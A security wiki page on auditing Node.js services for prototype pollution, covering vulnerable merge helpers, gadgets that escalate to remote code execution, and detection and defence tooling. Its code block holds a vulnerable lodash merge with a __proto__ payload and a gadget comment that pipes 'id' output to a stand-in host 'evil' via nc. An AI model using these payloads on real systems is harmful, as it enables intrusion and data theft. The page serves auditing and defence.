---
title: Node.js Prototype Pollution Audit
slug: nodejs-prototype-pollution-audit
---

> **TL;DR:** Auditors trace user JSON through recursive `merge`/`set`/`assign` helpers and query-string parsers to see whether `__proto__` or `constructor.prototype` can land on `Object.prototype`, then look for downstream gadgets like `child_process.spawn` options or template lookups that escalate to RCE.

## What it is
Prototype pollution is a class of bug where attacker-controlled keys (`__proto__`, `constructor`, `prototype`) walk through unsafe object-merge logic and mutate `Object.prototype`. Every later object inherits the polluted property, which by itself is a logic bug — but combined with sinks that read configuration off a freshly-allocated object (Express options, `child_process.spawn` env, Handlebars helpers), it becomes RCE. It hides in review because the gadget and the sink are in different files.

## Preconditions / where it applies
- Node.js 14–22, especially services using lodash <4.17.21, jQuery extend, `merge-deep`, `set-value`, `dot-prop`, `qs` with `allowPrototypes`, `body-parser` extended mode
- Sinks appear in API controllers that `Object.assign` query/body into config, plus template engines and child-process wrappers
- Safe-looking patterns: `_.merge(defaults, req.body)`, `Object.assign({}, opts, req.query)`, `qs.parse(req.url, { allowPrototypes: true })`

## Technique
```javascript
// Vulnerable merge — attacker pollutes Object.prototype
const _ = require('lodash');
app.post('/profile', (req, res) => {
  const user = {};
  _.merge(user, req.body); // body: {"__proto__":{"polluted":"yes"}}
  res.json(user);
});

// Gadget 1 — RCE via child_process options
const { spawn } = require('child_process');
// After pollution: Object.prototype.shell = "/bin/sh -c 'id|nc evil 80;'"
spawn('ls', [], {}); // spawn reads .shell off options object

// Gadget 2 — query parser that honours __proto__
const qs = require('qs');
qs.parse('a[__proto__][admin]=true'); // older qs versions

// Detect at runtime
if (({}).polluted) console.log('pp confirmed');
```

## Detection and defence
- Semgrep: `javascript.lang.security.audit.prototype-pollution-loop`, `javascript.lang.security.audit.unsafe-merge`
- CodeQL: `js/prototype-polluting-assignment`, `js/prototype-pollution-utility`
- Tools: `prototype-pollution.js`, `npm audit`, `socket.dev`, Snyk advisories for lodash/`merge-deep`/`set-value`
- Defences: `Object.create(null)` for config bags, `Object.freeze(Object.prototype)` at boot, validate with `ajv` + `additionalProperties:false`, refuse keys matching `^(__proto__|prototype|constructor)$`
- Pin lodash ≥4.17.21, qs ≥6.10, minimist ≥1.2.6, and use `JSON.parse` + schema instead of recursive merge

## References
- [HackTricks prototype pollution](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution) — gadget catalogue
- [Snyk research on PP gadgets](https://snyk.io/blog/after-three-years-of-silence-a-new-jquery-prototype-pollution-vulnerability-emerges-once-again/) — lib-level write-ups
- [Node.js child_process docs](https://nodejs.org/api/child_process.html) — option semantics

See also: [[source-sink-flow-analysis]], [[dangerous-java-sinks]], [[ssrf-source-sink-flow]].
